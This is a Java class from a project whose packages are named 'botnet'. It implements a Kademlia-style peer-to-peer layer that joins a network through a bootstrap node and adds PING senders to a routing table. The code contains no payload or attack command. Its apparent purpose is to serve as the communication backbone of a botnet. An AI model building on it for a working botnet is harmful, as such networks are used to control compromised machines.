package botnet.business_logic_layer;

import botnet.model.KademliaPeer;
import botnet.model.Peer;
import botnet.p2p_layer.P2pLayer;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.IOException;
import java.util.concurrent.BlockingQueue;

import static botnet_p2p.MessageOuterClass.Message;
import static botnet_p2p.MessageOuterClass.Message.Contact;


public class BusinessLogicLayer extends Thread {
    private static final Logger logger = LogManager.getLogger(P2pLayer.class);

    private P2pLayer p2pLayer;
    private KademliaPeer me;
    private BlockingQueue<Message> decodedMessagesQueue;

    public BusinessLogicLayer(P2pLayer p2pLayer) {
        this.p2pLayer = p2pLayer;

        decodedMessagesQueue = p2pLayer.getDecodedMessagesQueue();
    }

    public void joinNetwork(Peer bootstrapNode) throws IOException {
        p2pLayer.findNode(bootstrapNode, me);

        // on found Nodes
        //p2pLayer.addToRoutingTable(node);

    }

    @Override
    public void run() {
        try {
            Message messsage = decodedMessagesQueue.take();
            logger.info("message received by business logic layer");
            logger.info("processing this message");
            switch (messsage.getType()) {
                case PING:
                    // add sender to routing table
                    this.addToRoutingTable(messsage.getSender());

                    // respond
                    break;
                default:
                    logger.error("unsupported message type");
            }

        } catch (InterruptedException e) {
            // TODO
            e.printStackTrace();
        }
    }

    private void addToRoutingTable(Contact sender) {
        KademliaPeer kademliaPeer = new KademliaPeer(sender.getIP(), sender.getPort(), sender.getGuid());
        p2pLayer.getRoutingTable().insert(kademliaPeer);
    }
}
